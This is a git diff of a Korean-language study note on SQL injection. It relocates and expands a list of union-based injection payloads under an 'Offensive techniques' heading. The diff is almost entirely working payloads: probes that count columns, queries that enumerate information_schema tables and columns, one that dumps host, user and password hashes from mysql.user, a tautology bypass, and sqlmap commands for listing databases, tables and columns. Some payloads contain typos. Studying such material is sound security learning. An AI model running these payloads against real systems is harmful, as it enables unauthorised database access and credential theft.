@@ -57,21 +57,6 @@ Union은 두 개의 쿼리문에 대한 결과를 합쳐서 하나의 테이블�
 union injection을 하기 위해서는 두 가지의 조건이 필요하다.
 두 테이블의 컬럼 수가 같아야하고, 데이터형이 같아야한다.
 
-Example 1.
-
-union injection의 공격흐름이다.
-
-```
-' and db_name() > 1 --
-' union select null --
-' union select null,null --
-' union select null,null,null ... --
-' union select @@version --
-' union select table_name,null,null from infromation_schema.tables --
-' union select column_name,null,null from infromation_schema.columns where = '[table_name]' --
-' union select [column_name],null,null from [table_name] --
-```
-
 <br>
 
 ## Blind SQL Injection
@@ -121,9 +106,55 @@ Example 1.
 
 ## 🚩 Offensive techniques
 
+### Union
+
 ```
-' union select ALL 1,2,3 from information_schema.tabels
+' and db_name() > 1 --
+
+' union select null --
+
+' union select null,null --
+
+' union select null,null,null ... --
+
+' union select @@version --
+
+' union select table_name,null,null from infromation_schema.tables --
+
+' union select column_name,null,null from infromation_schema.columns where = '[table_name]' --
+
+' union select [column_name],null,null from [table_name] --
+
+' union select ALL 1,2,3 from information_schema.tabels --
+
+' union select database(), @@version, @@datadir --
+
+0 union select null
+
+0 union select null #
+
+0 union select host, user, password from mysql.user
+
+0 union select table_schema,table_name,column_name from information_schema.columns
+
+0 union select table_schema,table_name,column_name from information_schema.columns where table_schema!="mysql" and table_schema!="information_schema"
+
+' or 'a'='a #
 ```
+
+<br>
+
+### sqlmap
+
+```
+sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -DBs
+
+sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" --tables
+
+sqlmap -u "[주소]" --cookie="[cookie]" --data "[파라미터]" -p "[취약한 파라미터]" --columns
+```
+
+<br>
 
 ### 우회 bypass
 
